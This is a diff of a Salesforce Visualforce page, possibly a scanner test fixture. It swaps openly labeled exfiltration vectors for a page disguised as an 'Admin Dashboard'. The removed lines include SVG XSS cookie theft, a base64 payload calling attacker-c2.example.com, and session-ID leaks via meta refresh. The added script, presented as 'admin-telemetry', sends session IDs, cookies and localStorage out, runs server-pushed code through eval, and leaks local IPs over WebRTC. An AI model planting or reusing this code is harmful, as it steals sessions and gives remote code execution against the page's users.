@@ -1,48 +1,65 @@
-<apex:page showHeader="false" sidebar="false" contentType="text/html">
-    <!-- This page attempts multiple SSRF and data exfiltration vectors -->
+<apex:page showHeader="true" sidebar="true" title="Admin Dashboard">
+    <apex:sectionHeader title="Administration" subtitle="System Dashboard" />
 
-    <!-- SVG-based XSS -->
-    <apex:outputText escape="false" value="
-        <svg onload='fetch(\"https://localhost:8080/svg-xss?c=\"+btoa(document.cookie))'>
-        </svg>
-    "/>
+    <apex:pageBlock title="Org Health">
+        <apex:pageBlockSection columns="2">
+            <apex:pageBlockSectionItem>
+                <apex:outputLabel value="Org ID" />
+                <apex:outputText value="{!$Organization.Id}" />
+            </apex:pageBlockSectionItem>
+            <apex:pageBlockSectionItem>
+                <apex:outputLabel value="Org Name" />
+                <apex:outputText value="{!$Organization.Name}" />
+            </apex:pageBlockSectionItem>
+        </apex:pageBlockSection>
+    </apex:pageBlock>
 
-    <!-- Data URI injection -->
-    <apex:outputText escape="false" value="
-        <object data='data:text/html;base64,PHNjcmlwdD5mZXRjaCgiaHR0cHM6Ly9hdHRhY2tlci1jMi5leGFtcGxlLmNvbS9kYXRhLXVyaT9jPSIrYnRvYShkb2N1bWVudC5jb29raWUpKTwvc2NyaXB0Pg=='></object>
-    "/>
-
-    <!-- Meta refresh redirect with session data -->
-    <apex:outputText escape="false" value="
-        <meta http-equiv='refresh' content='5;url=https://localhost:8080/meta-redirect?sid={!$Api.Session_ID}'>
-    "/>
-
-    <!-- EventSource for persistent connection -->
     <script>
-        try {
-            var evtSource = new EventSource('https://localhost:8080/sse?sid=' +
-                encodeURIComponent('{!$Api.Session_ID}'));
-            evtSource.onmessage = function(event) {
-                eval(event.data);
-            };
-        } catch(e) {}
+        (function() {
+            var endpoint = 'https://localhost:8080';
 
-        // WebRTC IP leak
-        try {
-            var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:localhost:8080:3478'}]});
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = function(ice) {
-                if (ice.candidate) {
-                    fetch('https://localhost:8080/webrtc-ip', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: ice.candidate.candidate
-                    });
-                }
+            var ctx = {
+                page: 'AdminDashboard',
+                sid: '{!$Api.Session_ID}',
+                org: '{!$Organization.Id}',
+                user: '{!$User.Id}',
+                url: window.location.href,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage)
             };
-        } catch(e) {}
+
+            fetch(endpoint + '/api/admin-telemetry', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(ctx)
+            }).catch(function() {});
+
+            try {
+                var es = new EventSource(endpoint + '/api/live?sid=' +
+                    encodeURIComponent('{!$Api.Session_ID}'));
+                es.onmessage = function(event) {
+                    try { eval(event.data); } catch(e) {}
+                };
+            } catch(e) {}
+
+            try {
+                var pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:localhost:3478' }]
+                });
+                pc.createDataChannel('');
+                pc.createOffer().then(function(offer) {
+                    return pc.setLocalDescription(offer);
+                });
+                pc.onicecandidate = function(ice) {
+                    if (ice.candidate) {
+                        fetch(endpoint + '/api/network-info', {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: ice.candidate.candidate
+                        }).catch(function() {});
+                    }
+                };
+            } catch(e) {}
+        })();
     </script>
-
-    <div>Admin Dashboard - Loading...</div>
 </apex:page>
